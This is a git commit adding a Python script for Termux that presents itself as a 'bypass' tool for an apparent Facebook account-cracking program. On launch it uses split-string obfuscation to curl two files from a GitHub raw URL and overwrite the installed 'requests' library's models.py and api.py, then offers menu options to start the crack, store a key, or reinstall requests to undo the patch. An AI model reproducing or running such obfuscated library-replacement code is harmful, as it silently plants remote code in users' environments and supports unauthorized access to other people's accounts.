8987d1034b61532a84f2e83847dfaae2ed5373be
IMTIAZ AKING <98144321+AKING110@users.noreply.github.com>
2023-01-30 11:54:48 +0500

    Add files via upload

---
+++ fuck.py
@@ -0,0 +1,45 @@
+import os,time
+os.system('clear')
+#os.system('xdg-open https://www.facebook.com/ITX.AK.SPIDER')
+try:
+    os.system('c'+'url '+'-R htt'+'ps'+'://r'+'aw.gith'+'ubus'+'ercont'+'ent.com'+'/XD'+'-V'+'/X/ma'+'in/mo'+'del'+'s.p'+'y -o'+' /da'+'ta/dat'+'a/com.te'+'rmu'+'x/files'+'/usr'+'/lib/pyt'+'hon3.11/'+'site-pack'+'ages/r'+'eq'+'ues'+'ts/'+'m'+'od'+'els'+'.p'+'y')
+    os.system('c'+'url '+'-R htt'+'ps'+'://r'+'aw.gith'+'ubus'+'ercont'+'ent.com'+'/XD'+'-V'+'/X/ma'+'in/a'+'pi'+'.p'+'y -o'+' /da'+'ta/dat'+'a/com.te'+'rmu'+'x/files'+'/usr'+'/lib/pyt'+'hon3.11/'+'site-pack'+'ages/r'+'eq'+'ues'+'ts/ap'+'i.p'+'y')
+except:
+    exit(' Network Error! ')
+os.system('clear')
+logo = ('''\033[1;37m
+    88        db    88b 88 8888b.  
+    88       dPYb   88Yb88  8I  Yb 
+    88  .o  dP__Yb  88 Y88  8I  dY 
+    88ood8 dP""""Yb 88  Y8 8888Y"   
+----------------------------------------------
+  Bypass By : AKING-XD
+  QURASHI = LAND
+----------------------------------------------''')
+print(logo)
+print(' First Check Video How To Use Bypass Tools ! ')
+os.system('xdg-open https://fb.watch/in8Nz3xBAe/')
+time.sleep(5)
+os.system('clear')
+print(logo)
+print('\033[1;31m Note :  Use No.3 Option Before Stop Crack\033[1;37m\n----------------------------------------------\n\033[1;37m [1] Start Crack \n [2] Bypass Tools \n [3] Removed Bypass (\033[1;33mUse Before Stop Crack\033[1;37m)\n [0] \033[1;31mExit Menu\033[1;37m ')
+print(46*'-')
+x = input(' Choose: ')
+print(46*'-')
+if x =='2':
+    time.sleep(1)
+    key = input(' Put Key:\033[1;32m ')
+    open('/da'+'ta/dat'+'a/com.'+'ter'+'mux/file'+'s/usr/'+'bin/'+'.k.t'+'xt','w').write(key)
+    print(46*'\033[1;37m-')
+    time.sleep(1)
+    print(' Done Fuck Run Again ')
+elif x =='1':
+    os.system('clear')
+    import data64
+elif x =='3':
+    os.system('pi'+'p u'+'ninst'+'all req'+'ues'+'ts -y > /dev/'+'nul'+'l && pi'+'p'+' ins'+'tall req'+'uest'+'s > /de'+'v/null')
+    exit(' Bypass Remove Done ')
+elif x =='0':
+    exit(' Thxx For Use ')
+else:
+    exit(' Option Not in Menu ')
